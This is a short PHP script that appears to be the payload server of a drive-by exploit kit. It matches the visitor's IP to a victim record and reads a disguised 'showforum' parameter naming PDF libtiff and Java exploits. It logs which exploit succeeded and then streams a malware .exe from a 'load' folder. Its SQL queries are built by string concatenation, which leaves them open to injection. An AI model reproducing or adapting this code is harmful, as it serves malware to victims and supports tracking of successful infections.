<?php
	include "config.php";
	$IP  = $_SERVER['REMOTE_ADDR'];
	$sql = 'SELECT `thread` from `stat` WHERE `ip` = "'.$IP.'"';
    $a = mysql_query($sql);
	$b=mysql_fetch_array($a);
	$sql = 'SELECT `file` from `threads` WHERE `link` = "'.$b['thread'].'"';
    $a = mysql_query($sql);
	$b=mysql_fetch_array($a);
	$filename = "load/".$b['file'].".exe";
	if(isset($_GET['showforum']))
	{
		$temp = $_GET['showforum'];
		switch($temp)
		{
			case "lib": $spl = "pdf libtiff";break;
			case "obe": $spl = "java obe";break;
			case "rhino": $spl = "java rhino";break;
			default: die;
		}
	}
	else
		$spl = "Unknown";
	
	$sql = 'UPDATE `stat` SET `load` = "1" WHERE `ip` = "'.$IP.'"';
	@mysql_query($sql);
	$sql = 'UPDATE `stat` SET `exploit` = "'.$spl.'"  WHERE `ip` = "'.$IP.'"';
	@mysql_query($sql);	

	
$size = filesize($filename);
$fp = fopen($filename, "r");
$source = fread($fp, $size);
fclose($fp);

header("Accept-Ranges: bytes\r\n");
header("Content-Length: ".$size."\r\n");
header("Content-Disposition: inline; filename=".$filename);
header("\r\n");
header("Content-Type: application/octet-stream\r\n\r\n");
echo $source;
?>
